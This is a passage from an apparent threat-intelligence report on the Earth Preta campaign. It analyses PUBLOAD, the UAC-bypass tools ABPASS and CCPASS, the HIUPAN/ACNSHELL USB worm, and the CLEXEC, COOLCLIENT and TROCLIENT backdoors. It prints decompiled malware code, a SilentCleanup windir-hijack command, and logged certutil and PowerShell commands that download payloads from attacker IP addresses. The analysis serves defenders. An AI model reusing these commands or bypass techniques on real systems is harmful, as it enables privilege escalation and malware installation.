002D0072   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n  002D0082   C4 8B 4D 10 89 0E 1C 89 55 0C 48 08 48 55 1C 89   ..M....U.H.HU..\n  002D0092   51 E8 43 01 8B CC CC 8B 5D 0C 8B 30 0C 8B 45 FC   Q.C....]..0..E.\n  002D00A2   8B 45 FC 8B 55 08 8B 45 0C 5D 5D 5D CC 55 8B EC   .E..U..E.]...]U.\n  002D00B2   8B 45 FC 8B 55 08 8B 45 0C 5D 5D 5D CC 55 8B EC   .E..U..E.]...]U.\n  002D00C2   FF D1 8B E5 5D 5B 55 8B 55 0C 45 FC 8B 55 08 8B   ....]U.U.E.U..U.\n  002D00D2   55 0C 45 FC 8B 55 08 8B 45 0C 5D 5D 5D CC 55 8B   U.E.U..E.]...]U.\n  002D00E2   89 55 5C 89 4D 04 FC 8B 55 08 8B 45 0C 5D 5D 5D   U..U.U..E.]...]U.\n  002D00F2   EC 51 89 55 58 89 4D 04 FC 8B 55 08 8B 45 0C 5D   .Q.U.X.U..E.]...\n  002D0102   5D 5D 5D EC 51 89 55 58 89 4D 04 FC 8B 55 08 8B   ]]]Q.U.X.U..U...\n  002D0112   45 0C 5D 5D 5D EC 51 89 55 58 89 4D 04 FC 8B 55   E.]...]Q.U.X.U..\n  002D0122   08 8B 45 0C 5D 5D 5D EC 51 89 55 58 89 4D 04 FC   ..E.]...]Q.U.X.U.\n  002D0132   8B 55 08 8B 45 0C 5D 5D 5D EC 51 89 55 58 89 4D   U..E.]...]Q.U.X.\n  002D0142   04 FC 8B 55 08 8B 45 0C 5D 5D 5D EC 51 89 55 58   U..E.]...]Q.U.X.\n  002D0152   45 F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00   E..............\n  002D0162   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n  002D0172   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\n```\n\n*Figure 10. The final payload of the PUBLOAD HTTP variant*\n\n---\n\n### Table 2. Command codes in the PUBLOAD HTTP variant\n\n| **Command** | **Internal string**       |\n| ----------- | ------------------------- |\n| 0x03        | -                         |\n| 0x01        | -                         |\n| 0x1B        | *UploadBegin error : %d!* |\n| 0x1D        | *UploadData error : %d!*  |\n| 0x1A        | -                         |\n| 0x1E        | *CmdStart error : %d!*    |\n| 0x1F        | *CmdWrite error : %d!*    |\n| 0x30        | *CmdWrite error : %d*     |\n| 0x20        | -                         |\n\n---\n\nIn addition, we found some interesting debug strings and event names among the PUBLOAD samples.\n\n```image\nAlt: Figure 11. Event name in PUBLOAD\nDescription: The image displays a snippet of C/C++ code related to a dynamic link library (DLL) function. The code includes various operations such as opening an event, exiting the process, creating an event, and retrieving the module file name. The structure of the code is typical for malware analysis, indicating actions that might be involved in stealthy operations or command execution. Comments and variable names suggest it is part of a larger codebase focused on malicious activities.\nTranscription: |\n  BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)\n  {\n      void *v3; // ecx\n      int v5; // [esp+0h] [ebp-1Ch]\n      int v6; // [esp+4h] [ebp-18h]\n      int v7; // [esp+8h] [ebp-14h]\n      int v8; // [esp+Ch] [ebp-10h]\n      int v9; // [esp+10h] [ebp-Ch]\n      int v10; // [esp+14h] [ebp-8h]\n      int v11; // [esp+18h] [ebp-4h]\n  \n      if ( fdwReason == 1 )\n      {\n          if ( OpenEventA(0x1F0003u, 0, \"ARRxYxelonmusxxxx\") )\n              ExitProcess(0);\n          CreateEventA(0, 0, 0, \"ARRxYxelonmusxxxx\");\n          v7 = 0;\n          v8 = 0;\n          v9 = 0;\n          v10 = 0;\n          v6 = 0;\n          sub_10018F60(&v6);\n          GetModuleFileNameW(0, &PathName, 0x104u);\n          wcschr(&PathName, 0x5Cu)[1] = 0;\n          SetCurrentDirectoryW(&PathName);\n          sub_100193D0();\n          v5 = 0;\n          v10 = 0;\n          v11 = 0;\n          sub_100190E0((int)&v5);\n          sub_1001938(v3); // main\n      }\n      return 1;\n  }\n```\n\n*Figure 11. Event name in PUBLOAD*\n\n```image\nAlt: Figure 12. Debug string in PUBLOAD\nDescription: The image displays a code snippet related to debugging output strings in a programming context. It includes two main functions: `Main_Trump` and `Main_Exit1`. Each function contains calls to `OutputDebugStringA`, which outputs specific strings, such as \"Support Trump campaign 2024\", \"i love Trump\", and others, including a string with a potentially offensive term. The last line uses `OutputDebugStringW` to output a Unicode string related to \"elonmusk-mysteriouspower\". The code is formatted in a structured manner, highlighting various debug outputs associated with the functions.\nTranscription: |\n  void __cdecl Main_Trump()\n  {\n      OutputDebugStringA(\"Support Trump campaign 2024\");\n  }\n  \n  void __cdecl Main_Exit1()\n  {\n      OutputDebugStringA(\"i love Trump\");\n      OutputDebugStringA(\"Please sanction China\");\n      OutputDebugStringA(\"Fu_ck U 360\");\n  }\n  \n  OutputDebugStringW(L\"elonmusk-mysteriouspower\");\n```\n\n*Figure 12. Debug string in PUBLOAD*\n\nIn summary, we think that the new TONESHELL and PUBLOAD archives have been evolving and now have something in common. For example, both of them are now being placed in decoy documents (such as Google Drive links) in order to bypass antivirus scanning.\n\n---\n\n## Discovery\n\nOnce the threat actors obtain access to the victim’s environment, they can start inspecting the environment via the following commands:\n\n```\nnet user\n\nnet user <username>\n\nnet user <username> /DOMAIN\n```\n\n---\n\n## Privilege escalation\n\nIn this campaign, we discovered several tools used for UAC bypass in Windows 10. We will go into detail for each of them.\n\n### HackTool.Win32.ABPASS\n\nHackTool.Win32.ABPASS is a tool used to bypass UAC in Windows 10. Based on our analysis, it reuses codes from the function ucmShellRegModMethod3, which is from a famous open-source project called UACME. A report from Sophos introduces this tool.\n\nThis tool accepts an argument, and the following data is written into the registry:\n\n---\n\n### Table 3. Registry keys changed by ABPASS\n\n| **Registry Key**                                            | **Name**    | **Value**  |\n| ----------------------------------------------------------- | ----------- | ---------- |\n| *HKEY_USERS\\<SID>-1001_Classes\\aaabbb32\\shell\\open\\command* | *(Default)* | *argv[1]*  |\n| *HKEY_USERS\\<SID>-1001_Classes\\ms-settings\\CurVer*          | *(Default)* | *aaabbb32* |\n\n---\n\nIt also changes how Windows handles the *ms-settings* protocol — in this case, the string *ms-settings* is a Programmatic Identifier (ProgID). If the CurVer key is set under a ProgID, it will be used for versioning and mapping the current ProgID (*ms-settings*) to the one specified in the CurVer’s default value. In turn, the behavior of *ms-settings* is redirected to the custom defined ProgID *aaabbb32*. It also sets up a new ProgID *aaabbb32* and its shell open command. Finally, *fodhelper.exe* or *computerDefaults.exe* will be executed to trigger the *ms-settings* protocol.\n\n```image\nAlt: Figure 13. The added ProgID aaabbb32\nDescription: The image displays a screenshot of the Windows Registry Editor. It shows the registry key path: HKEY_USERS\\<SID>-1001_Classes\\aaabbb32\\shell\\open\\command. The key contains a default value labeled '(Default)' with the data 'notepad.exe', indicating that the command associated with the 'aaabbb32' ProgID is configured to launch Notepad when executed.\nTranscription: |\n  Computer\\HKEY_USERS\\S-1-5-21-77653537-166538346-2952355930-1001_Classes\\aaabbb32\\shell\\open\\command\n  \n  Name                     Type      Data\n  ------------------------------------------------\n  (Default)               REG_SZ    notepad.exe\n```\n\n*Figure 13. The added ProgID aaabbb32*\n\n---\n\n### HackTool.Win32.CCPASS\n\nHackTool.Win32.CCPASS is another tool that is also used for Windows 10 UAC bypass and similarly reuses codes from the function ucmMsStoreProtocolMethod in the project UACME.\n\n```image\nAlt: Figure 14. Code similarities in CCPASS and ucmMsStoreProtocolMethod\nDescription: The image displays a side-by-side comparison of two code snippets. Both snippets showcase functions related to handling application protocol associations in Windows. The code on the left appears to deal with enumerating handlers for a specific protocol, while the code on the right seems to handle similar operations but is structured slightly differently. Key variables and function calls are highlighted, indicating similarities and differences in the implementation, which relates to the context of privilege escalation tactics discussed in the accompanying text.\nTranscription: |\n  c\n  if (FAILED(SHA$assocEnumHandlersForProtocolByApplication(lpProtocol, \n      &IID_IEnumAssocHandlers, (PVOID*)&enumHandlers))) \n      return;\n  \n  do {\n      cellFetched = 0;\n      assocHandler = NULL;\n      hr = enumHandlers->lpVtbl->Next(enumHandlers, 1, &assocHandler, &cellFetched);\n      if (SUCCEEDED(hr) && cellFetched) {\n          hr = assocHandler->lpVtbl->QueryInterface(assocHandler, \n              IID_IObjIdWithProgID, (PVOID*)&progId);\n          if (SUCCEEDED(hr)) {\n              lpProgId = NULL;\n              hr = progId->lpVtbl->GetProgID(&progId, &lpProgId);\n              if (SUCCEEDED(hr) && lpProgId) {\n                  cbName = (4 + strlen(lpProtocol)) \n                      - strlen(lpProgId) * sizeof(WCHAR);\n                  lpValue = (LPSTR)superApplio(cbName);\n                  if (lpValue) {\n                      strcpy(lpValue, lpProtocol);\n                      strcat(lpValue, TEXT(\"\"));\n                      strcat(lpValue, lpProgId);\n                  }\n              }\n          }\n      }\n  } while (1);\n  ```\n  \n  ```c\n  progId = 0x164;\n  result = SHA$assocEnumHandlersForProtocolByApplication(a1, &iid, (void**)&enumHandlers);\n  if (result < 0)\n      return result;\n  \n  do {\n      cellFetched[0] = 0;\n      assocHandler = 0x164;\n      v7 = enumHandlers->lpVtbl->Next(enumHandlers, i164, &assocHandler, cellFetched);\n      if (v7 > 0 && cellFetched) {\n          v7 = assocHandler->lpVtbl->QueryInterface(assocHandler, \n              1_1801487C0, &progId); // IID_IObjIdWithProgID\n          if (v7 > 0 && progId) {\n              v16 = lstrlenW(a1);\n              v15 = lstrlenW((LPCWSTR)progId);\n              v6 = 2164 + (v16 + v15 * 4);\n              lpString1 = (LPWSTR)sub_180068B3(v10);\n              if (lpString1) {\n                  lstrcpyn(lpString1, (LPCTSTR)progId, a1);\n                  lstrcat(lpString1, (LPCTSTR)Data[0]); \n                  RegSetValueExW(HKEY_CURRENT_USER, \n                      L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\ApplicationAssociationToasts\", \n                      lpString1, \n                      4u, \n                      (const BYTE*)a2);\n                  sub_18006854D0((int64)lpString1);\n              }\n              (void)(__fastcall*)(progId->lpVtbl->Release)(progId);\n          }\n      }\n  } while (1);\n```\n\n*Figure 14. Code similarities in CCPASS and ucmMsStoreProtocolMethod*\n\nIt works in a similar way to ABPASS. However, unlike ABPASS, it hijacks the *ms-windows-store* protocol. The hack tool CCPASS works as follows:\n\n1. It disables the application association toasts for the protocol *ms-windows-store*. \n2. It creates a new Shell in the registry. \n3. It invokes the undocumented API UserAssocSet to update the file association. \n4. It executes *WSReset.exe* to trigger this protocol.\n\nIn Windows 10 and above, the system shows a new toast dialog for selecting the open application for the selected file type. To hide this window, the tool explicitly adds new entries to *HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\ApplicationAssociationToasts* to disable all toasts related to the protocol *ms-windows-store*.\n\n*Figure 15. An example of the application association toast*\n\n```image\nAlt: Figure 16. Hiding application association toasts via the registry\nDescription: The image displays a segment of assembly code related to the HackTool.Win32.CCPASS malware. The code lines show various instructions, including moving values to registers and calling a specific function. The highlighted parts indicate operations related to modifying registry entries that disable application association toasts for the 'ms-windows-store' protocol. This segment is crucial for understanding how CCPASS functions in the context of privilege escalation within Windows environments.\nTranscription: |\n  00007FFAFF30103A  41: B9  04000000       mov r9d,4\n  00007FFAFF301040  4C: 88  55 A8          mov r8,byte ptr ss:[rbp+A8]\n  00007FFAFF301047  48: 8D  15 222E0000    lea rdx,qword ptr ds:[7FFAFF3D3E70]\n  00007FFAFF30104E  48: C7  C1 01000080    mov rcx,FFFFFFFF80000001\n  00007FFAFF301055  FF: 15 CDCF1100       call qword ptr ds:[<&reqSetKeyValue>]\n```\n\n*Figure 16. Hiding application association toasts via the registry*\n\nOnce this is done, the tool starts to alter the shell command of *ms-windows-store* and finally triggers it using *WSReset.exe*.\n\n---\n\n### SilentCleanup\n\nIn Windows 10, there is a native Windows service called “SilentCleanup.” This service has the highest privileges that can be abused for Windows 10 UAC bypass. Normally, this service is intended for running *%windir%\\system32\\cleanmgr.exe*. However, the environment variable *%windir%* can be hijacked and changed to any path to achieve privilege escalation.\n\n```image\nAlt: Figure 17. Malicious commands abusing the SilentCleanup service\nDescription: The image depicts a series of commands that illustrate the privilege escalation technique using the SilentCleanup service in Windows 10. It shows a timeline with a start time of '2022-06-16 06:12:40' and the execution path of 'C:\\ProgramData\\helpedge\\upservice.exe'. The commands are color-coded: yellow for the command prompt initiation, and red for two malicious commands that manipulate the environment variable 'windir' and schedule a task that runs the SilentCleanup service. This diagram visually conveys the steps taken by threat actors to exploit the SilentCleanup service for privilege escalation.\nTranscription: |\n  2022-06-16 06:12:40\n  C:\\ProgramData\\helpedge\\upservice.exe\n  C:\\Windows\\SysWOW64\\cmd.exe\n  C:\\Windows\\SysWOW64\\reg.exe add hkcu\\Environment /v windir /d \"cmd /c c:\\users\\public\\1.Exe&reg delete hkcu\\Environment /v windir /f && REM \"\n  C:\\Windows\\SysWOW64\\schtasks.exe /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n```\n\n*Figure 17. Malicious commands abusing the SilentCleanup service*\n\nWe observed that the threat actors used this technique to execute *c:\\users\\public\\1.exe*.\n\n---\n\n## Lateral movement\n\nIn this stage, we observed certain malware such as HIUPAN and ACNSHELL (initially introduced and analyzed by Mandiant and Sophos) being used to install themselves to removable disks and create a reverse shell.\n\n### USB Worm: Worm.Win32.HIUPAN and Backdoor.Win32.ACNSHELL\n\nWe found a pair of malware comprised of a USB worm and a reverse shell — including a USB worm and a reverse shell (detected as Worm.Win32.HIUPAN and Backdoor.Win32.ACNSHELL, respectively) — being used to spread themselves over removable drives.\n\n```image\nAlt: Figure 18. HIUPAN and ACNSHELL infection flow\nDescription: The image is a flowchart illustrating the infection process of the malware variants Worm.Win32.HIUPAN and Backdoor.Win32.ACNSHELL. It depicts the steps taken by the USB Driver.exe program in the malware's operation. The flowchart shows how USB Driver.exe sideloads u2ec.dll, reads usb.ini, checks if it is installed, and either installs itself to a specific directory or sideloads the ACNSHELL component, which then creates a reverse shell. The diagram includes icons representing executable files, DLL files, and actions like copying files and adding registry keys, enhancing users' understanding of the malware's mechanics.\nTranscription: |\n  1. Copies files to %programdata% and renames USB Driver.exe to disk_watch.exe\n  \n  2. Adds a registry run key for disk_watch.exe\n  \n  3. Installed?\n     No\n     └── Sideloads\n         DateCheck.exe\n     Yes\n     └── Sideloads\n         ACNSHELL\n         Creates reverse shell\n         rzlog4cpp.dll\n  \n  Infects removable disk and copies files to autorun.inf\n  \n  © 2023 TREND MICRO\n```\n\n*Figure 18. HIUPAN and ACNSHELL infection flow*\n\nThe *USB Driver.exe* program first sideloads *u2ec.dll*, which then loads the payload file *usb.ini*. They have the following PDB strings, respectively:\n\n- *G:\\project\\APT\\U盘劫持\\new\\u2ec\\Release\\u2ec.pdb* \n- *G:\\project\\APT\\U盘劫持\\new\\shellcode\\Release\\shellcode.pdb*\n\nThe string *U盘劫持* means “U disk hijacking,” where “U disk” refers to removable drives.\n\n*USB Driver.exe* then starts checking whether it is properly installed. If it is installed, it will start to infect more removable disks and copy files to a folder named *autorun.inf*. If it is not installed, it installs itself to *%programdata%* and then sets the registry run key for persistence.\n\nFinally, the ACNSHELL malware *rzlog4cpp.dll* is sideloaded. It will then create a reverse shell via *ncat.exe* to the server *closed[.]theworkpc[.]com*.\n\n---\n\n## Command and Control (C&C) stage\n\nEarth Preta employed several tools and commands for the C&C stage. For example, the group used *certutil.exe* to download the legitimate WinRAR binary as *rar1.exe* from the server 103[.]159[.]132[.]91.\n\n```image\nAlt: Figure 19. The certutil.exe program downloads the WinRAR binary\nDescription: The image illustrates a timeline and command execution sequence involving the download of a file using the certutil.exe program. It shows a command line instruction executed from the directory C:\\Windows\\SysWOW64\\cmd.exe, where certutil.exe is used to download the file 'rar.exe' from the specified IP address (103.159.132.91) and save it as 'rar1.exe' in the public user directory. The date and time of the command execution are also noted (2022-10-16 02:04:27), highlighting the stealthy techniques utilized in the command and control (C&C) stage of the Earth Preta malware campaign.\nTranscription: |\n  2022-10-16 02:04:27\n  C:\\Windows\\SysWOW64\\cmd.exe\n  C:\\Windows\\SysWOW64\\certutil.exe -urlcache -split -f http://103.159.132.91/rar.exe c:\\users\\public\\rar1.exe\n```\n\n*Figure 19. The certutil.exe program downloads the WinRAR binary*\n\nWe also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.]181 for future use.\n\n```image\nAlt: Figure 20. PowerShell downloading malware\nDescription: The image shows a detailed log of command-line executions related to a cyber threat incident. It features timestamps, paths, and commands executed via the Windows Command Prompt (cmd.exe) to download files from a specified IP address using PowerShell. The commands illustrate the execution of file downloads, including a text file and multiple archives, indicating a method used by threat actors to facilitate malware deployment.\nTranscription: |\n  2022-06-16 05:54:10\n  C:\\ProgramData\\help\\edge\\upservice.exe\n  C:\\Windows\\SysWOW64\\cmd.exe\n      C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofle (new-object system.net.webclient).downloadfile('http://103.159.132.181/1.txt','c:\\users\\public\\1.exe');\n      C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofle (new-object system.net.webclient).downloadfile('http://103.159.132.181/2.txt','c:\\windows\\tasks\\libcef.dll');\n      C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofle (new-object system.net.webclient).downloadfile('http://103.159.132.181/1.rar','c:\\users\\public\\1.rar');\n      C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofle (new-object system.net.webclient).downloadfile('http://103.159.132.181/UC.rar','c:\\users\\public\\UC.rar');\n      C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofle (new-object system.net.webclient).downloadfile('http://103.159.132.181/3.rar','c:\\users\\public\\3.rar');\n```\n\n*Figure 20. PowerShell downloading malware*\n\nIn certain instances, they even leveraged the WinRAR binary installed on the victim hosts to decompress all the malware.\n\n```image\nAlt: Figure 21. Decompressing malware with the installed WinRAR binary\nDescription: The image appears to be a timeline or flow diagram detailing the sequence of commands executed during a cyber attack. It illustrates the use of different executables, including 'cmd.exe', 'curl.exe', and 'Rar.exe', alongside various files and tasks located in specific directories on a Windows system. The commands are shown with timestamps, indicating the actions taken by the threat actors, such as downloading and handling malware files. The structure and content provide valuable insight into the Command and Control (C&C) stage of the attack.\nTranscription: |\n  2022-11-04 03:06:59\n      C:\\Windows\\SysWOW64\\cmd.exe\n          C:\\Windows\\SysWOW64\\curl.exe\n              C:\\Windows\\Tasks\\img.rar\n                  C:\\Windows\\Tasks\\mg10.rar\n                  C:\\Windows\\Tasks\\vt127.rar\n                  C:\\Windows\\Tasks\\u5.rar\n          C:\\Windows\\SysWOW64\\cmd.exe\n              C:\\Program Files\\WinRAR\\Rar.exe\n                  C:\\Windows\\Tasks\\de.exe\n                  C:\\Windows\\Tasks\\SensorAware.dll\n                  C:\\Windows\\Tasks\\msedge.dll\n                  C:\\Windows\\Tasks\\ACUI.dll\n                  C:\\Windows\\Tasks\\OleView.exe\n                  C:\\Windows\\Tasks\\cookie_exporter.exe\n                  C:\\Windows\\Tasks\\ACUI.DLL.UI\n```\n\n*Figure 21. Decompressing malware with the installed WinRAR binary*\n\nAlthough we found several logs involving multiple pieces of dropped malware, we only managed to retrieve a few of them. Among all our collected samples, we will introduce the most noteworthy ones.\n\n---\n\n### Backdoor.Win32.CLEXEC\n\nThe file name of the backdoor CLEXEC is *SensorAware.dll*. This is a simple backdoor that is capable of executing commands and clearing event logs.\n\n```image\nAlt: Figure 22. Command codes of CLEXEC\nDescription: The image displays a snippet of code related to a backdoor known as Backdoor.Win32.CLEXEC. The code includes a function that processes commands, evidenced by various case statements handling different inputs. Key actions in the code include interlocked exchanges, displaying a message box, and clearing event logs. This technical depiction provides valuable insight into the functionalities and command handling of the CLEXEC backdoor, making it relevant for Cyber Threat Intelligence analysis.\nTranscription: |\n  LONG __thiscall f_backdoor_commands_10002FA0(int this, _BYTE *a2, int a3)\n  {\n      LONG result; // eax\n  \n      result = (unsigned __int8)*a2 - 81;\n      switch (*a2)\n      {\n          case 'Q':\n              result = InterlockedExchange((volatile LONG *)(this + 40536), 1);\n              break;\n          case 'T':\n              *(_DWORD *)(this + 4 * *(_DWORD *)(this + 40528) + 528) = sub_10003630(\n                  0,\n                  0,\n                  (int)f_WinExec_10002D60,\n                  *(_DWORD *)(*(_DWORD *)(this + 4) + 172),\n                  0,\n                  0,\n                  1);\n              result = *(_DWORD *)(this + 40528) + 1;\n              *(_DWORD *)(this + 40528) = result;\n              break;\n          case 'V':\n              result = MessageBoxA(0, Text, 0, 0);\n              break;\n          case 'X':\n              result = f_clean_event_log_10002E40();\n              break;\n          default:\n              return result;\n      }\n      return result;\n  }\n```\n\n*Figure 22. Command codes of CLEXEC*\n\n---\n\n### Backdoor.Win32.COOLCLIENT\n\nThe backdoor COOLCLIENT was first introduced in a report from Sophos; the sample mentioned in the report was compiled in 2021. In our case, the COOLCLIENT sample we analyzed had a more recent compilation time in 2022, and while it provides the same functionalities, it has the added capability to open a decoy document (*work.pdf*) when the current process name has “.pdf” or “.jpg” file extensions. It contains fewer OutputDebugStrings calls. Meanwhile, *loader.ja* is used under two processes: One is under *googleupdate.exe*, which is used for the first sideloading. The second is under *winver.exe*, which is injected to conduct backdoor behaviors. Furthermore, COOLCLIENT applies obfuscation techniques that we discuss in later sections.\n\n```image\nAlt: Figure 23. Open decoy document\nDescription: The image displays a snippet of code, likely written in C or C++, that is part of the functionality of the backdoor malware COOLCLIENT. The code includes operations for handling filenames, checking for specific file extensions like '.pdf' and '.jpg', and executing a command to open a decoy document named 'work.pdf'. It features functions such as 'memset', 'GetModuleFileNameA', and 'ShellExecute', which are common in malware for obfuscation and execution purposes.\nTranscription: |\n  c\n  memset(Filename, 0, sizeof(Filename));\n  str_lwr_a(Filename);\n  if (sub_10003F70((const _m128i *)Filename, a1)\n      if (sub_10003F70((const _m128i *)Filename, a1)\n  {\n      memset(File, 0, 0x104u);\n      GetModuleFileNameA(0, File, 0x104u);\n      v1 = (_BYTE *)sub_10003F60(File, 92);\n      v2 = 0x40;\n      v1 = 0;\n      while (++*v2)\n      strcpy(v2, \"Work.pdf\");\n      $ShellExecuteA(0, \"open\", File, 0, 0, 5);\n      v4 = GetCommandLineW();\n      v5 = CommandLineToArgvW(v4, &pNumArgs);\n```\n\n*Figure 23. Open decoy document*\n\nFigure 24 shows the whole execution flow of COOLCLIENT.\n\n```image\nAlt: Figure 24. Execution flow of COOLCLIENT\nDescription: The image presents a detailed flowchart illustrating the execution process of the backdoor malware COOLCLIENT. It includes various components such as the 'googleupdate.exe' file, which sideloads the COOLCLIENT loader, and the sequence of operations including reading and decrypting essential files like 'goopdate.ja' and 'loader.ja.' The flowchart highlights checks for permissions, installation procedures for persistence, and UAC bypass methods. Each step is clearly labeled, demonstrating how the malware interacts with system processes and communicates with the command and control (C&C) server.\nTranscription: |\n  googleupdate.exe\n      |\n      v\n  Sideloads\n      |\n      v\n  CoolClient loader\n      |\n      v\n  libvlc.dll\n      |\n      v\n  loader.ja\n      |\n      v\n  Checks if current process == winver.exe\n      |\n      +--------------------------+\n      |                          |\n     Yes                         No\n      |                          |\n      v                          v\n  In user                   Check arav[1]\n      |                          |\n      v                          |\n  Reads and decrypts           work\n  goopdate.ja (CoolClient)       |\n      |                          |\n      v                          |\n  Reads and decrypts             |\n  goopdate.ja (CoolClient)       |\n      |                          |\n      v                          |\n  Injects                      passuac\n      |                          |\n      v                          |\n  Connects to C&C                |\n      |                          |\n      v                          |\n  Installs itself for            |\n  persistence with the           |\n  command                        |\n  \"C:\\ProgramData\\GoogleUpdate\\googleupdate.exe\"\n```\n\n*Figure 24. Execution flow of COOLCLIENT*\n\nThe arguments of COOLCLIENT provide the following capabilities:\n\n- **install.** There are several ways to install COOLCLIENT, detailed here:\n  1. It installs itself by creating an InstallSvc service called InstallSvc which will trigger “*googleupdate.exe work*”.\n  2. It sets up a run key via the command *C:\\ProgramData\\GoogleUpdate\\googleupdate.exe work* for persistence.\n\n- **work.** The malware will continue to read and decrypt *goopdate.ja* and inject it into *winver.exe* for the next-stage payload (COOLCLIENT), which contains malicious behaviors.\n\n- **passuac.** The malware will check if the process *avp.exe* exists. If *avp.exe* doesn’t exist, UAC bypass will be executed via the CMSTPLUA COM interface. If *avp.exe* exists, UAC bypass will be executed via the AppInfo RPC service.\n\n```image\nAlt: Figure 25. UAC Bypass via the CMSTPLUA COM interface\nDescription: The image displays a snippet of source code related to backdoor malware functionality. It includes various programming structures such as function definitions, variable declarations, and loops. The code appears to be written in C or C++, with references to Windows API functions and COM interfaces, indicating its use for system-level manipulation and potential privilege escalation. Specific lines are focused on manipulating class identifiers and memory operations, suggesting the code’s role in establishing a backdoor or executing malicious actions.\nTranscription: |\n  void *ppv; // [esp+264h] [ebp-4h] BYREF\n  v15 = this;\n  ppv = 0;\n  pclsid = 0x164;\n  v1 = 0;\n  iid = 0x164;\n  CLSIDFromString(L\"{3E5FC79-9A51-4367-9063-A120244FBE7C}\", &pclsid);\n  IIDFromString(L\"{6EDD6D74-C007-4E75-B76A-E574099E524C}\", &iid);\n  memset(pszName, 0, 0x208u);\n  v2 = v7;\n  do {\n      v3 = v2[1];\n      ++v2;\n  } while (v3);\n  while (v3) {\n      qmemcpy(v2, L\"Elevation:Administrator:new\", 0x3Au);\n      v4 = v7;\n      v5 = *((WORD *)v4 + 1);\n      v7 = iid;\n  }\n  while (v5);\n  while (*((DWORD *)pBindOptions) = 36);\n  v12 = 4;\n  wcscp(v4, (wchar_t *const)L\"{3E5FC79-9A51-4367-9063-A120244FBE7C}\");\n```\n\n*Figure 25. UAC Bypass via the CMSTPLUA COM interface*\n\n```image\nAlt: Figure 26. UAC Bypass via the AppInfo RPC service\nDescription: The image displays a snippet of code related to the functionality of the COOLCLIENT backdoor. It includes elements such as RPC (Remote Procedure Call) binding and security settings. The code indicates operations for allocating memory, creating a well-known SID (Security Identifier), and setting authentication information. This snippet is likely part of the technical analysis of how COOLCLIENT operates within the command and control stage, showcasing its methods for establishing secure communication.\nTranscription: |\n  while ( v18 ) ;\n  v19 = RpcStringBindingComposeW(\n      (RPC_WSTR)L\"201ef99a-7fa0-444c-9399-19ba84f12a1a\",\n      (RPC_WSTR)L\"ncalrpc\",\n      0,\n      0,\n      0,\n      0,\n      &StringBinding\n  );\n  if ( !v19 )\n  {\n      v19 = RpcBindingFromStringBindingW(StringBinding, &Binding);\n      RpcStringFreeW(&StringBinding);\n      if ( !v19 )\n      {\n          v20 = LocalAlloc(0x40u, uBytes);\n          if ( v20 )\n          {\n              if ( CreateWellKnownSid(WinLocalSystemSid, 0, v20, &uBytes) )\n              {\n                  SecurityQOS.Version = 3;\n                  SecurityQOS.ImpersonationType = 3;\n                  SecurityQOS.Capabilities = 1;\n                  SecurityQOS.IdentityTracking = 0;\n                  v27 = v20;\n                  v19 = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, &SecurityQOS);\n                  if ( !v19 )\n                  {\n                      v31 = Binding;\n                      Binding = 0;\n                      LocalFree(v20);\n                      goto LABEL_20;\n                  }\n              }\n          }\n      }\n  }\n  else\n  {\n      v19 = GetLastError();\n  }\n```\n\n*Figure 26. UAC Bypass via the AppInfo RPC service*\n\nAccording to our analysis, it reads the encrypted configuration file *time.sig*. It is also able to communicate through different network protocols such as UDP (User Datagram Protocol) and TCP (Transmission Control Protocol). Based on some internal strings and the APIs used by Earth Preta, the functionalities of this backdoor can be inferred as follows:\n\n- Send portmap \n- Build connection \n- Read file \n- Delete file \n- Keystrokes and windows monitoring \n\n---\n\n### Backdoor.Win32.TROCLIENT\n\nThe backdoor TROCLIENT, which was also first disclosed in Sophos’s report, is similar to COOLCLIENT. However, this backdoor has an anti-debugging technique, which will check if the running processes have the strings *dbg.exe* or *olly*.\n\n```image\nAlt: Figure 27. TROCLIENT anti-debugging technique.\nDescription: The image displays a segment of code that illustrates the anti-debugging technique utilized by the backdoor malware TROCLIENT. It includes several function calls and conditions, particularly focusing on checking for the presence of debugging processes by comparing against the strings 'dbg.exe' and 'olly'. The code structure features conditional statements and function definitions typical in software development, indicating the malware's measures to evade detection during analysis.\nTranscription: |\n  c\n  if (v3 == (HANDLE)-1)\n      return 1;\n  \n  LABEL_11:\n      malicious_main();\n      return 1;\n  \n  if (!Process32FirstW(v3, &pe))\n      goto LABEL_9;\n  \n  LABEL_9:\n      CloseHandle(v3);\n      v6 = GetModuleHandleA(\"ntdll.dll\");\n      ZwSetInformationObject = GetProcAddress(v6, \"ZwSetInformationObject\");\n      if (ZwSetInformationObject) {\n          LOWORD(a2) = 256;\n          v8 = GetCurrentProcess();\n          DuplicateHandle(v8, v8, &TargetHandle, 0, 0, 0);\n          (void (__stdcall *)(HANDLE, int, int *, int))ZwSetInformationObject(TargetHandle, 4, &a2, 2);\n          DuplicateHandle(v8, TargetHandle, v8, &TargetHandle, 0, 0, 0);\n      }\n      goto LABEL_11;\n  \n  while (1) {\n      sub_1001CEB0((__m128i *)v11, 0x208u);\n      v4 = 0;\n      v5 = pe.szExeFile[v4++];\n      pe.szExeFile[4 + 259] = v5;\n  \n      while (v5) {\n          sub_1002D74(v11);\n          if (sub_1001D24(v11, L\"dbg.exe\") || sub_1001D24(v11, L\"olly\"))\n              return 0;\n          if (!Process32NextW(v3, &pe))\n              goto LABEL_9;\n      }\n  }\n```\n\n*Figure 27. TROCLIENT anti-debugging technique.*\n\nFigure 28 shows the whole execution flow of TROCLIENT.\n\n```image\nAlt: Figure 28. Execution flow of TROCLIENT\nDescription: The image illustrates the execution flow of the TROCLIENT backdoor malware. It features a flowchart that outlines the process starting from the 